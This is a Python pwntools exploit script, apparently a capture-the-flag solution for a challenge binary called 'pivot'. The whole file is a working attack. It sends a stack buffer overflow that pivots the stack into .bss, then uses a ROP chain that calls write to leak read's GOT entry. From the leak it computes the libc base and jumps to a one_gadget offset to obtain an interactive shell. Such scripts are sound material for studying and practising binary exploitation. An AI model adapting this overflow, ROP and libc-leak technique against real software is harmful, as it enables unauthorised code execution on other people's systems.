from pwn import *

p = process('./pivot')
#p = remote('pwnable.shop', 20206)
e = ELF('./pivot')
l = e.libc

context.log_level = "debug"

p_rdi_r = 0x00000000004007d3
p_rdi_r15_r = 0x00000000004007d1
main = 0x00000000004006B6
l_r = 0x0000000040075F
r = 0x0000000000400760

bss = e.bss() + 500
log.info('bss + 500 : ' + str(hex(bss)))

payload = 'a' * 0x50
payload += p64(bss)
#payload += p64(e.got['read']+0x50)
payload += p64(0x000000000040072E)

pause()
p.send(payload)

log.info('read_buffer : ' + str(hex(bss-0x50)))


payload = p64(0)
payload += p64(p_rdi_r15_r)
payload += p64(e.got['read'])
payload += p64(0)
payload += p64(e.plt['write'])
payload += p64(main)
payload += 'a' * (0x50 - len(payload))
payload += p64(bss - 0x50)
payload += p64(l_r)

p.send(payload)

p.recvuntil('\x5c\x05\x40\x00\x00\x00\x00\x00')
libc = u64(p.recv(6).ljust(8,'\x00')) - l.sym['read']

log.info('libc : ' + hex(libc))

payload = 'a' * 0x50
payload += p64(bss)
payload += p64(libc + 0x45216)

p.sendline(payload)

p.interactive()
